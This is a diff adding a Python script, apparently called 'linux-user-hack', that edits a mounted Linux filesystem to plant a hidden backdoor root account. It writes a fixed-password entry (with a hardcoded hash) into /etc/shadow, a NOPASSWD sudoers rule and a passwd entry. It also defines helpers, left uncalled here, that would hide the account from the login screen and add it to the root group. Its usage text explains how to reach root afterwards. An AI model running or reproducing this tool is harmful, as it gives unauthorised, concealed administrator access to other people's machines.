@@ -1,0 +1,80 @@
+#!/bin/python
+
+from os import chdir
+from sys import argv
+
+try:
+    chdir(argv[1])
+except Exception as e:
+    print(e)
+    print('Run as sudo, provide argument. Example:\nsudo ./linux-user-hack /mnt')
+
+USERNAME = 'username'
+PASSWORD = 'ez'
+
+print('Username:', USERNAME)
+print('Password:', PASSWORD)
+print('By default, password is set to:ez\n')
+print('These values can be changed in the source code.')
+
+print('To better understand this programm, check out https://linuxize.com/post/etc-shadow-file')
+print('To understand how to change the default password, check out https://linuxconfig.org/how-to-hash-passwords-on-linux')
+print('Hide user from login screen: https://askubuntu.com/questions/92349/how-do-i-hide-a-particular-user-from-the-login-screen')
+
+print('\nBy default, this programm only adds user to the shadow file, sudoers file and the passwd file(which should be the standard on any lnux machine when adding a new user). Further modifications to the source code allow more functionality, the function names are self-explanatory')
+print('')
+print('Usage')
+print('1. Login as the user you created, or open terminal from a non root user and run "su <username>"')
+print('2. Enter password you picked for this user')
+print('3. run "sudo su" and you are now root')
+
+def add_user_shadow():
+    l = open('etc/shadow', 'r').readlines()
+    l.insert(2, f'{USERNAME}:{PASSWORD}:::::::\n')
+    open('etc/shadow', 'w').writelines(l)
+
+def add_user_root_group():
+    #some systems have additional users in the /etc/group file, so by adding the user to
+    #the root group, you should be able to sudo su and become root
+    #this might not work, so calling the function
+    l = open('etc/group', 'r').readlines()
+    l[0] = l[0][:-1]+f', {USERNAME}\n'
+    open('etc/group', 'w').writelines(l)
+
+def add_user_sudoers():
+    open('etc/sudoers', 'a').write(f'\n{USERNAME} ALL=(ALL:ALL) NOPASSWD: ALL')
+
+def add_user_passwd():
+    lines = open('etc/passwd', 'r').readlines()
+
+    users = [i for i in map(lambda x: int(x.split(':')[2]), lines) if i>=1000]
+    new_user_id = 1000
+    while new_user_id in users:
+        new_user_id += 1
+
+    open('etc/passwd', 'w').write(''.join(lines)+f'{USERNAME}:x:{new_user_id}:{new_user_id}::/home:/bin/bash\n')
+
+def hide_user():
+    try:
+        open(f'var/lib/AccountsService/users/{USERNAME}', 'w').write('[User]\nSystemAccount=true')
+    except Exception as e:
+        print('Unable to hide user')
+        print(e)
+
+def get_password(p: str='ez'):
+    try:
+        from crypt import crypt, METHOD_SHA512
+        #from getpass import getpass
+        #return crypt(getpass(), METHOD_SHA512)
+        return crypt(p, METHOD_SHA512)
+    except Exception as e:
+        print('Exception:', e)
+        print('Defaulting to password:\nez')
+        return '$6$RtmY.mKJigzlChiT$oyx8naTEYpJhc6an/e3CU/u1m7xKRW/jrqfOG4Z3xEyhmYCIyssrmX5mTruawgnmgbkua9Fb52RyhJ.R5/pEk0'
+
+PASSWORD = get_password(PASSWORD)
+
+add_user_shadow()
+add_user_sudoers()
+add_user_passwd()
+
